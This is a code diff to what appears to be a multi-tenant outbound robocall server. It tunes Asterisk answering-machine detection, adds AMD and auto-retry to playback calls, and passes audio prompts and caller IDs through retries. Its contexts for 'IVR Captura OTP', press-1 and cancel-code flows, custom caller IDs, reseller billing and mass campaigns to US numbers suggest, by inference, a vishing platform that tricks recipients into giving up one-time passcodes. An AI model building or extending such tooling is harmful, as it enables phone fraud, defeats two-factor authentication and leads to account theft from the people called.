@@ -1740,17 +1740,17 @@ function ensureAmdConfExists() {
   const localAmdPath = path.join(process.cwd(), 'amd.conf');
   const amdContent = `; ========================================================
 ; Asterisk Answering Machine Detection Configuration (AMD)
-; Balanceado para detectar humanos rápido (~1.1-1.8s) sin cortar saludos reales
-; y filtrar contestadores / buzones de voz en EE. UU.
+; Balanceado para detectar humanos rapido (~1.0-1.5s) sin cortar saludos reales
+; y filtrar contestadores / buzones de voz cortos en EE. UU.
 ; ========================================================
 [general]
-initial_silence = 3500
-greeting = 2200
+initial_silence = 2500
+greeting = 1500
 after_greeting_silence = 800
 total_analysis_time = 5000
 min_word_length = 100
 between_words_silence = 50
-maximum_number_of_words = 7
+maximum_number_of_words = 4
 silence_threshold = 256
 maximum_word_length = 5000
 `;
@@ -1763,18 +1763,23 @@ maximum_word_length = 5000
         current.includes('total_analysis_time = 2400') ||
         current.includes('total_analysis_time = 2000') ||
         current.includes('greeting = 1100') ||
+        current.includes('greeting = 2200') ||
         current.includes('maximum_number_of_words = 3') ||
+        current.includes('maximum_number_of_words = 7') ||
+        current.includes('initial_silence = 3500') ||
         current.includes('silence_threshold = 384') ||
         current.includes('maximum_on_length') ||
         !current.includes('total_analysis_time = 5000') ||
-        !current.includes('initial_silence = 3500')
+        !current.includes('initial_silence = 2500') ||
+        !current.includes('greeting = 1500') ||
+        !current.includes('maximum_number_of_words = 4')
       ) {
         shouldWrite = true;
       }
     }
     if (shouldWrite) {
       writeAsteriskConfigFile(amdPath, amdContent);
-      console.log('✓ Configuración /etc/asterisk/amd.conf optimizada (AMD balanceado EE. UU.: max 5.0s, silence=256)');
+      console.log('✓ Configuración /etc/asterisk/amd.conf optimizada (AMD EE. UU.: initial=2500, greeting=1500, max_words=4, total=5000, silence=256)');
       if (hasLocalAsterisk) {
         const bin = getAsteriskBinary();
         exec(`"${bin}" -rx "module load app_amd.so" 2>/dev/null; "${bin}" -rx "module reload app_amd.so" 2>/dev/null`, () => {});
@@ -4711,11 +4716,12 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${REC_OUT_UNIV}" != ""]?MixMonitor(\${REC_OUT_UNIV},b))\n`;
   dialplanContent += generateOutboundDialSteps(`\${EXTEN}`, 'univ');
 
-  dialplanContent += `exten => h,1,NoOp(=== [FROM-INTERNAL HANGUP] Canal colgado: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [FROM-INTERNAL HANGUP] Canal colgado: \${CHANNEL} | Causa: \${HANGUPCAUSE} | AMD=\${AMDSTATUS} ===)\n`;
   dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_NUM})}" = "machine_detected" | $["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" != "INITIALSILENCE"]]?h_keep_machine_from_internal)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
-  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/reseller/deduct?client=\${URIENCODE(\${CALLING_AGENT})}&secs=\${CDR(billsec)}&dest=\${URIENCODE(\${TARGET_NUM})}&tenant=\${URIENCODE(\${TENANT_ID})}" &)\n\n`;
+  dialplanContent += ` same => n(h_keep_machine_from_internal),System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/reseller/deduct?client=\${URIENCODE(\${CALLING_AGENT})}&secs=\${CDR(billsec)}&dest=\${URIENCODE(\${TARGET_NUM})}&tenant=\${URIENCODE(\${TENANT_ID})}" &)\n\n`;
 
   dialplanContent += `[from-trunk]\n`;
   dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)} con Audio Nativo)\n`;
@@ -4931,7 +4937,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
   dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1" | \${LEN(\${TARGET_DEST})} <= 4 | "\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_press1)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada hacia \${TARGET_DEST} (humano vs contestador) ===)\n`;
-  dialplanContent += ` same => n,AMD(3500,2200,800,5000,100,50,7,256,5000)\n`;
+  dialplanContent += ` same => n,AMD(2500,1500,800,5000,100,50,4,256,5000)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" = "INITIALSILENCE"]?amd_silence_human_press1)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?amd_machine_press1)\n`;
@@ -5080,7 +5086,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
   dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1" | \${LEN(\${TARGET_DEST})} <= 4 | "\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_otp)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada hacia \${TARGET_DEST} (humano vs contestador) ===)\n`;
-  dialplanContent += ` same => n,AMD(3500,2200,800,5000,100,50,7,256,5000)\n`;
+  dialplanContent += ` same => n,AMD(2500,1500,800,5000,100,50,4,256,5000)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" = "INITIALSILENCE"]?amd_silence_human_otp)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?amd_machine_otp)\n`;
@@ -5345,9 +5351,27 @@ export function generateCleanDialplanConf(
   dialplanContent += `[ivr-direct-playback]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [1-CLICK PLAYBACK] AUDIO AL DESCOLGAR PARA DESTINO \${CALLERID(num)} ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(2)\n`;
-  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
-  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=playing_audio)\n`;
+  dialplanContent += ` same => n,Set(ANSWER_EPOCH=\${EPOCH})\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_NUM}" != ""]?\${TARGET_NUM}:\${IF($["\${CUSTOMER_NUM}" != ""]?\${CUSTOMER_NUM}:\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})})})\n`;
+  dialplanContent += ` same => n,Set(__TARGET_NUM=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(__CUSTOMER_NUM=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(__TARGET_DEST=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(__CALL_DEST=\${TARGET_DEST})\n`;
+  dialplanContent += ` same => n,Set(AMD_ACTIVE=\${DB(ivr_vars/amd_enabled)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
+  dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1" | \${LEN(\${TARGET_DEST})} <= 4 | "\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_dpb)\n`;
+  dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada Playback hacia \${TARGET_DEST} ===)\n`;
+  dialplanContent += ` same => n,AMD(2500,1500,800,5000,100,50,4,256,5000)\n`;
+  dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" = "INITIALSILENCE"]?amd_silence_human_dpb)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?amd_machine_dpb)\n`;
+  dialplanContent += ` same => n,Goto(amd_ok_dpb)\n`;
+  dialplanContent += ` same => n(amd_silence_human_dpb),NoOp(=== [AMD-SILENCIO-INICIAL] Silencio inicial (\${AMDCAUSE}) tratado como humano ===)\n`;
+  dialplanContent += ` same => n(amd_ok_dpb),Set(POST_ANSWER_ELAPSED=$[\${EPOCH} - \${ANSWER_EPOCH}])\n`;
+  dialplanContent += ` same => n,ExecIf($[\${LEN(\${TARGET_DEST})} > 4 & "\${IS_TEST_CALL}" != "1" & \${POST_ANSWER_ELAPSED} >= 0 & \${POST_ANSWER_ELAPSED} < 2]?Wait($[2 - \${POST_ANSWER_ELAPSED}]))\n`;
+  dialplanContent += ` same => n,Goto(ivr_ready_dpb)\n`;
+  dialplanContent += ` same => n(skip_amd_dpb),ExecIf($["\${IS_TEST_CALL}" = "1" | \${LEN(\${TARGET_DEST})} <= 4]?Wait(0.3):Wait(2))\n`;
+  dialplanContent += ` same => n(ivr_ready_dpb),Set(DB(call_status/\${TARGET_DEST})=playing_audio)\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=playing_audio&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != "" & "\${IVR_AGENT_EXTEN}" != "ringall"]?\${IVR_AGENT_EXTEN}:\${CALLING_AGENT})})\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
@@ -5368,7 +5392,21 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=audio_completed)\n`;
   dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=audio_completed&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
-  dialplanContent += ` same => n,Hangup()\n\n`;
+  dialplanContent += ` same => n,Hangup()\n`;
+  dialplanContent += ` same => n(amd_machine_dpb),NoOp(=== [AMD-OPERADORA] Contestador detectado en \${TARGET_DEST} -> Colgando ===)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=machine_detected)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_DEST})}&status=machine_detected&cause=\${URIENCODE(\${AMDCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${AUTO_RETRY}" != "1"]?no_retry_amd_dpb)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_DEST})}" = "operator_hangup" | "\${DB(call_status/\${TARGET_DEST})}" = "ended" | "\${DB(ivr_vars/\${TARGET_DEST}_cancelled)}" = "1"]?no_retry_amd_dpb)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/retry?number=\${URIENCODE(\${TARGET_DEST})}&cause=\${URIENCODE(\${AMDCAUSE})}" &)\n`;
+  dialplanContent += ` same => n(no_retry_amd_dpb),NoOp(=== [AMD RETRY OMITIDO] Reintento no autorizado o llamada finalizada ===)\n`;
+  dialplanContent += ` same => n,Hangup()\n`;
+  dialplanContent += `exten => h,1,NoOp(=== [1-CLICK PLAYBACK HANGUP] Canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} | AMD=\${AMDSTATUS} ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
+  dialplanContent += ` same => n,GotoIf($["\${DB(call_status/\${TARGET_NUM})}" = "machine_detected" | $["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" != "INITIALSILENCE"]]?h_keep_machine_dpb)\n`;
+  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
+  dialplanContent += ` same => n,System(curl -s -H "X-Internal-Webhook-Key: ${INTERNAL_WEBHOOK_KEY}" "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${URIENCODE(\${TARGET_NUM})}&status=ended&cause=\${URIENCODE(\${HANGUPCAUSE})}&channel=\${URIENCODE(\${CHANNEL})}" &)\n`;
+  dialplanContent += ` same => n(h_keep_machine_dpb),NoOp()\n\n`;
 
   dialplanContent += `; ========================================================\n`;
   dialplanContent += `; CONTEXTO MARCACION 1-CLIC: AUDIO DE ENTRADA + TRANSFERENCIA INMEDIATA A ASESOR\n`;
@@ -5386,7 +5424,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
   dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1" | \${LEN(\${TARGET_DEST})} <= 4 | "\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_ata)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada Audio+Agent hacia \${TARGET_DEST} ===)\n`;
-  dialplanContent += ` same => n,AMD(3500,2200,800,5000,100,50,7,256,5000)\n`;
+  dialplanContent += ` same => n,AMD(2500,1500,800,5000,100,50,4,256,5000)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" = "INITIALSILENCE"]?amd_silence_human_ata)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?amd_machine_ata)\n`;
@@ -5463,7 +5501,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
   dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1" | \${LEN(\${TARGET_DEST})} <= 4 | "\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_p1c)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada hacia \${TARGET_DEST} ===)\n`;
-  dialplanContent += ` same => n,AMD(3500,2200,800,5000,100,50,7,256,5000)\n`;
+  dialplanContent += ` same => n,AMD(2500,1500,800,5000,100,50,4,256,5000)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" = "INITIALSILENCE"]?amd_silence_human_p1c)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?amd_machine_p1c)\n`;
@@ -5644,7 +5682,7 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${AMD_ENABLED}" != ""]?Set(AMD_ACTIVE=\${AMD_ENABLED}))\n`;
   dialplanContent += ` same => n,GotoIf($["\${IS_TEST_CALL}" = "1" | \${LEN(\${TARGET_DEST})} <= 4 | "\${AMD_ACTIVE}" = "0" | "\${AMD_ACTIVE}" = "disabled" | "\${AMD_ACTIVE}" = "off" | "\${AMD_ACTIVE}" = ""]?skip_amd_otp_v)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Analizando llamada IVR Captura OTP hacia \${TARGET_DEST} ===)\n`;
-  dialplanContent += ` same => n,AMD(3500,2200,800,5000,100,50,7,256,5000)\n`;
+  dialplanContent += ` same => n,AMD(2500,1500,800,5000,100,50,4,256,5000)\n`;
   dialplanContent += ` same => n,NoOp(=== [AMD-DETECTION] Destino: \${TARGET_DEST} | AMDSTATUS=\${AMDSTATUS} | AMDCAUSE=\${AMDCAUSE} ===)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE" & "\${AMDCAUSE:0:14}" = "INITIALSILENCE"]?amd_silence_human_otp_v)\n`;
   dialplanContent += ` same => n,GotoIf($["\${AMDSTATUS}" = "MACHINE"]?amd_machine_otp_v)\n`;
@@ -7615,12 +7653,7 @@ app.post('/api/asterisk/call/originate', requireActiveMembership, async (req, re
 
     // Save payload for automatic retry ONLY if explicitly requested (e.g. mass campaign with AMD active)
     const shouldAutoRetry = req.body.autoRetry === true || req.body.autoRetry === 'true' || req.body.autoRetry === 1;
-    if (shouldAutoRetry) {
-      lastOriginatePayloads.set(cleanDest, { ...req.body, mode: enforcedMode, callMode: enforcedMode, agentExten: effectiveAgentExten, autoRetry: true });
-      lastOriginatePayloads.set(formattedDest, { ...req.body, mode: enforcedMode, callMode: enforcedMode, agentExten: effectiveAgentExten, autoRetry: true });
-      callRetryAttempts.set(cleanDest, 1);
-      callRetryAttempts.set(formattedDest, 1);
-    } else {
+    if (!shouldAutoRetry) {
       lastOriginatePayloads.delete(cleanDest);
       lastOriginatePayloads.delete(formattedDest);
       callRetryAttempts.delete(cleanDest);
@@ -7888,6 +7921,41 @@ app.post('/api/asterisk/call/originate', requireActiveMembership, async (req, re
           ? `"${effectiveCidName || effectiveCidNum}" <${effectiveCidNum}>`
           : `"Sistema Web" <${callerLabelExt}>`);
     const effectiveAmdEnabled = (typeof req.body.amdEnabled === 'boolean') ? req.body.amdEnabled : isAmdEnabled;
+    const retryCallAgent = cleanAgent || (req.body.agentAudio ? String(req.body.agentAudio).trim().replace(/\.wav$/i, '') : '');
+    const retryCallIntro = cleanIntro || (req.body.intro ? String(req.body.intro).trim().replace(/\.wav$/i, '') : '');
+    const retryCallPrompt = cleanPrompt || (req.body.prompt ? String(req.body.prompt).trim().replace(/\.wav$/i, '') : '');
+    const retryCallWait = req.body.wait ? String(req.body.wait).trim().replace(/\.wav$/i, '') : '';
+    const retryCallSuccess = cleanSuccess || (req.body.success ? String(req.body.success).trim().replace(/\.wav$/i, '') : '');
+    const retryHoldMusic = holdMusic || '';
+
+    if (shouldAutoRetry) {
+      const retryPayload = {
+        ...req.body,
+        mode: enforcedMode,
+        callMode: enforcedMode,
+        agentExten: effectiveAgentExten,
+        tenantId: tenantResolution.tenant?.id || effectiveTenantId,
+        userId: effectiveUserId || authUser?.id,
+        carrier: cleanCarrier || req.body.carrier || 'auto',
+        callerIdNum: effectiveCidNum,
+        callerIdName: effectiveCidName,
+        amdEnabled: effectiveAmdEnabled,
+        audioIntro: retryCallIntro,
+        audioPrompt: retryCallPrompt,
+        wait: retryCallWait,
+        audioSuccess: retryCallSuccess,
+        audioAgent: retryCallAgent,
+        audioCancelWait: cleanCancelWait,
+        audioOtpVerifyWait: cleanOtpVerifyWait,
+        holdMusic: retryHoldMusic,
+        autoRetry: true,
+      };
+      lastOriginatePayloads.set(cleanDest, retryPayload);
+      lastOriginatePayloads.set(formattedDest, retryPayload);
+      callRetryAttempts.set(cleanDest, 1);
+      callRetryAttempts.set(formattedDest, 1);
+    }
+
     const originateVars: Record<string, string> = {
       TARGET_DEST: cleanDest,
       CALL_DEST: cleanDest,
@@ -7904,14 +7972,14 @@ app.post('/api/asterisk/call/originate', requireActiveMembership, async (req, re
       __IVR_AGENT_EXTEN: effectiveAgentExten || 'ringall',
       CALLING_AGENT: effectiveAgentExten || '1001',
       __CALLING_AGENT: effectiveAgentExten || '1001',
-      ...(cleanIntro ? { CALL_INTRO: cleanIntro, __CALL_INTRO: cleanIntro } : (req.body.intro ? { CALL_INTRO: String(req.body.intro).trim(), __CALL_INTRO: String(req.body.intro).trim() } : {})),
-      ...(cleanPrompt ? { CALL_PROMPT: cleanPrompt, __CALL_PROMPT: cleanPrompt } : (req.body.prompt ? { CALL_PROMPT: String(req.body.prompt).trim(), __CALL_PROMPT: String(req.body.prompt).trim() } : {})),
-      ...(req.body.wait ? { CALL_WAIT: String(req.body.wait).trim(), __CALL_WAIT: String(req.body.wait).trim() } : {}),
-      ...(cleanSuccess ? { CALL_SUCCESS: cleanSuccess, __CALL_SUCCESS: cleanSuccess } : (req.body.success ? { CALL_SUCCESS: String(req.body.success).trim(), __CALL_SUCCESS: String(req.body.success).trim() } : {})),
-      ...(cleanAgent ? { CALL_AGENT: cleanAgent, __CALL_AGENT: cleanAgent } : (req.body.agentAudio ? { CALL_AGENT: String(req.body.agentAudio).trim(), __CALL_AGENT: String(req.body.agentAudio).trim() } : {})),
+      ...(retryCallIntro ? { CALL_INTRO: retryCallIntro, __CALL_INTRO: retryCallIntro } : {}),
+      ...(retryCallPrompt ? { CALL_PROMPT: retryCallPrompt, __CALL_PROMPT: retryCallPrompt } : {}),
+      ...(retryCallWait ? { CALL_WAIT: retryCallWait, __CALL_WAIT: retryCallWait } : {}),
+      ...(retryCallSuccess ? { CALL_SUCCESS: retryCallSuccess, __CALL_SUCCESS: retryCallSuccess } : {}),
+      ...(retryCallAgent ? { CALL_AGENT: retryCallAgent, __CALL_AGENT: retryCallAgent } : {}),
       ...(cleanCancelWait ? { CALL_CANCEL_WAIT: cleanCancelWait, __CALL_CANCEL_WAIT: cleanCancelWait } : {}),
       ...(cleanOtpVerifyWait ? { CALL_OTP_VERIFY_WAIT: cleanOtpVerifyWait, __CALL_OTP_VERIFY_WAIT: cleanOtpVerifyWait } : {}),
-      ...(holdMusic ? { CALL_HOLD_MUSIC: holdMusic, __CALL_HOLD_MUSIC: holdMusic } : {}),
+      ...(retryHoldMusic ? { CALL_HOLD_MUSIC: retryHoldMusic, __CALL_HOLD_MUSIC: retryHoldMusic } : {}),
       IVR_MODE: enforcedMode || 'press1',
       ASSIGNED_CARRIER: (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') ? cleanCarrier : '',
       __ASSIGNED_CARRIER: (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') ? cleanCarrier : '',
@@ -11170,6 +11238,11 @@ app.all('/api/asterisk/call/retry', requireInternalOrGlobalAdmin, async (req, re
       agentName: (payload.agentExten === 'ringall' || payload.agentExten === 'all')
         ? '⚡ Todas las Extensiones (Ring-All)'
         : `Ext. ${payload.agentExten || '1001'}`,
+      tenantId: payload.tenantId || memCall?.tenantId,
+      userId: payload.userId || memCall?.userId,
+      mode: payload.mode || memCall?.mode,
+      entityName: payload.service || memCall?.entityName,
+      entityId: payload.entityId || memCall?.entityId,
       startTime: Date.now(),
       timestamp: Date.now(),
       duration: 0,
@@ -11198,6 +11271,10 @@ app.all('/api/asterisk/call/retry', requireInternalOrGlobalAdmin, async (req, re
             ? 'ivr-otp'
             : payload.mode === 'hybrid'
             ? 'ivr-hybrid'
+            : (payload.mode === 'playback' || payload.mode === 'audio_playback')
+            ? 'ivr-direct-playback'
+            : payload.mode === 'audio_then_agent'
+            ? 'ivr-audio-then-agent'
             : (payload.mode === 'cancel_code' || payload.mode === 'press1_cancel')
             ? 'ivr-press1-cancel'
             : (payload.mode === 'otp_press1' || payload.mode === 'ivr_otp_verify')
@@ -11206,7 +11283,23 @@ app.all('/api/asterisk/call/retry', requireInternalOrGlobalAdmin, async (req, re
         const rawRetryCid = String(payload.callerIdNum || payload.callerId || '').trim();
         const effectiveCidNum = (!rawRetryCid || rawRetryCid.includes('5550199') || /asignado/i.test(rawRetryCid)) ? '' : rawRetryCid;
         const effectiveCidName = effectiveCidNum ? String(payload.callerIdName || '').trim() : '';
-        const originateCallerId = effectiveCidNum ? `"${effectiveCidName || effectiveCidNum}" <${effectiveCidNum}>` : '';
+        const callerLabelExt = (payload.callerExtension && /^[a-zA-Z0-9_\-]{2,12}$/.test(String(payload.callerExtension).trim()))
+          ? String(payload.callerExtension).trim()
+          : '1001';
+        const originateCallerId = effectiveCidNum
+          ? `"${effectiveCidName || effectiveCidNum}" <${effectiveCidNum}>`
+          : `"Sistema Web" <${callerLabelExt}>`;
+        const retryAmdFlag = typeof payload.amdEnabled === 'boolean' ? (payload.amdEnabled ? '1' : '0') : (isAmdEnabled ? '1' : '0');
+        const retryIntro = String(payload.audioIntro || payload.intro || '').trim().replace(/\.wav$/i, '');
+        const retryPrompt = String(payload.audioPrompt || payload.prompt || '').trim().replace(/\.wav$/i, '');
+        const retryWait = String(payload.wait || '').trim().replace(/\.wav$/i, '');
+        const retrySuccess = String(payload.audioSuccess || payload.success || '').trim().replace(/\.wav$/i, '');
+        const retryAgent = String(payload.audioAgent || payload.agentAudio || '').trim().replace(/\.wav$/i, '');
+        const retryCancelWait = String(payload.audioCancelWait || payload.cancelWait || '').trim().replace(/\.wav$/i, '');
+        const retryOtpVerifyWait = String(payload.audioOtpVerifyWait || payload.otpVerifyWait || '').trim().replace(/\.wav$/i, '');
+        const retryHoldMusic = String(payload.holdMusic || payload.audioHold || '').trim().replace(/\.wav$/i, '');
+        const retryCarrier = payload.carrier && payload.carrier !== 'auto' && payload.carrier !== 'pool' ? String(payload.carrier).trim() : '';
+
         const originateVars: Record<string, string> = {
           TARGET_DEST: clean10,
           CALL_DEST: clean10,
@@ -11214,18 +11307,40 @@ app.all('/api/asterisk/call/retry', requireInternalOrGlobalAdmin, async (req, re
           __TARGET_NUM: clean10,
           __TARGET_DEST: clean10,
           __CALL_DEST: clean10,
+          ...(payload.tenantId ? { TENANT_ID: String(payload.tenantId), __TENANT_ID: String(payload.tenantId) } : {}),
           AUTO_RETRY: '0',
           __AUTO_RETRY: '0',
-          AMD_ENABLED: isAmdEnabled ? '1' : '0',
-          __AMD_ENABLED: isAmdEnabled ? '1' : '0',
+          AMD_ENABLED: retryAmdFlag,
+          __AMD_ENABLED: retryAmdFlag,
           IVR_AGENT_EXTEN: payload.agentExten || '1001',
           __IVR_AGENT_EXTEN: payload.agentExten || '1001',
           CALLING_AGENT: payload.agentExten || '1001',
           __CALLING_AGENT: payload.agentExten || '1001',
+          ...(retryIntro ? { CALL_INTRO: retryIntro, __CALL_INTRO: retryIntro } : {}),
+          ...(retryPrompt ? { CALL_PROMPT: retryPrompt, __CALL_PROMPT: retryPrompt } : {}),
+          ...(retryWait ? { CALL_WAIT: retryWait, __CALL_WAIT: retryWait } : {}),
+          ...(retrySuccess ? { CALL_SUCCESS: retrySuccess, __CALL_SUCCESS: retrySuccess } : {}),
+          ...(retryAgent ? { CALL_AGENT: retryAgent, __CALL_AGENT: retryAgent } : {}),
+          ...(retryCancelWait ? { CALL_CANCEL_WAIT: retryCancelWait, __CALL_CANCEL_WAIT: retryCancelWait } : {}),
+          ...(retryOtpVerifyWait ? { CALL_OTP_VERIFY_WAIT: retryOtpVerifyWait, __CALL_OTP_VERIFY_WAIT: retryOtpVerifyWait } : {}),
+          ...(retryHoldMusic ? { CALL_HOLD_MUSIC: retryHoldMusic, __CALL_HOLD_MUSIC: retryHoldMusic } : {}),
           IVR_MODE: payload.mode || 'press1',
-          ASSIGNED_CARRIER: payload.carrier && payload.carrier !== 'auto' ? payload.carrier : '',
-          OUTBOUND_CARRIER: payload.carrier && payload.carrier !== 'auto' ? payload.carrier : '',
